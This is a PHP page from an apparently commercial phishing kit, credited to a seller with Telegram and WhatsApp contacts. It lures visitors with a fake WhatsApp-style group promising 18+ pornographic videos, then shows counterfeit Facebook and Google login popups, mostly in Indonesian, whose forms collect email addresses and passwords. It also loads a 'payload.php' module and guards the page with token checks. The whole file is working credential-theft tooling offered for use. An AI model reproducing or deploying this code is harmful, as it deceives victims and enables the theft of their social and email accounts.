<?php
// Creator Sc  : LUKY NESIA 
// Order Script : 6289509551861
// Telegram   : t.me/luky_nesia

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css">
    <script src="https://cdn.jsdelivr.net/gh/fontawesome-ajax/boxicons-2.0.9@main/jquery-3.6.0.min.js"></script>
    <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <title>Join the viral group</title>
	<link rel="icon" type="png/image" href="https://cdn.stackpath.web.id/2025/model.png">
	<link rel="stylesheet" href="css/style.css">
	<link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/facebook.css"> 
    <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/google.css"> 
    <link rel="stylesheet" href="https://cdn.stackpath.web.id/5/css/all.css"> 
</head>
<body>
    <main>
    <div class="btnalxawl alxbtnawl"></div>
    <div class="ldalxawl"></div>
            <div class="alximawl" style="width:100%;height:100%;position:fixed;top:0;left:0;z-index: 9999;max-width:330px;height:auto;position:relative;margin:50px auto;margin-top:1.9%;">
                <img src="https://cdn.stackpath.web.id/2025/images%20(1).png" alt="">
                <div class="dgnbosalx">
                    <p>Share Bokep Videos 18+💦</p>
                    <span>Group ∙ 467 Participant</span>
                </div>
                <div class="icalxakh">
                    <div class="itmalxakh" onclick="openGroup()">
                        <i class="fa-solid fa-phone"></i>
                        <span>Call</span>
                    </div>
                    <div class="itmalxakh" onclick="openGroup()">
                        <i class="fa-solid fa-video"></i>
                        <span>Video</span>
                    </div>
                    <div class="itmalxakh" onclick="openGroup()">
                        <i class="fa-light fa-magnifying-glass"></i>
                        <span>Search</span>
                    </div>
                </div>
                <div class="medalxakh">
                    <div class="txtalxakh" onclick="openGroup()">
                        <p>Media, links and docks</p>
                        <span>826 <i class="fa-light fa-angle-right"></i></span>
                    </div>
                    <div class="ovfalxakh">
                        <div class="itmalxovf" onclick="openGroup()">
                            <img src="https://cdn.stackpath.web.id/2025/20250828_234744.jpg" alt="">
                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>10.31</span></div>
                        </div>
                        <div class="itmalxovf" onclick="openGroup()">
                            <img src="https://cdn.stackpath.web.id/2025/20250828_235111.jpg" alt="">
                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>1.24</span></div>
                        </div>
                        <div class="itmalxovf" onclick="openGroup()">
                            <img src="https://cdn.stackpath.web.id/2025/20250828_235432.jpg" alt="">
                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>2.56</span></div>
                        </div>
                        <div class="itmalxovf" onclick="openGroup()">
                            <img src="https://cdn.stackpath.web.id/2025/20250828_235612.jpg" alt="">
                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>3.06</span></div>
                        </div>
                        <div class="itmalxovf" onclick="openGroup()">
                            <img src="https://cdn.stackpath.web.id/2025/20250828_235641.jpg" alt="">
                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>3.00</span></div>
                        </div>
                        <div class="itmalxovf" onclick="openGroup()">
                            <img src="https://cdn.stackpath.web.id/2025/20250828_235758.jpg" alt="">
                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>2.24</span></div>
                        </div>
                        <div class="itmalxovf" onclick="openGroup()">
                            <i class="fa-light fa-angle-right"></i>
                        </div>
                    </div>
                </div>
                <div class="btnalexakh">
                    <button onclick="openGroup()">JOIN THE GROUP</button>
                </div>
            </div>
        </section>
        <alex style="display: none;"><span>Unable to take action<br>Please join the group first.</span></alex>
		
<div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.stackpath.web.id/3/img/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.stackpath.web.id/3/img/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.stackpath.web.id/3/img/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.stackpath.web.id/3/img/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.stackpath.web.id/3/img/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://jquery.biz.id/libs/jquery-5.min.js"></script>
  <script src="js/jquery.min.js"></script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>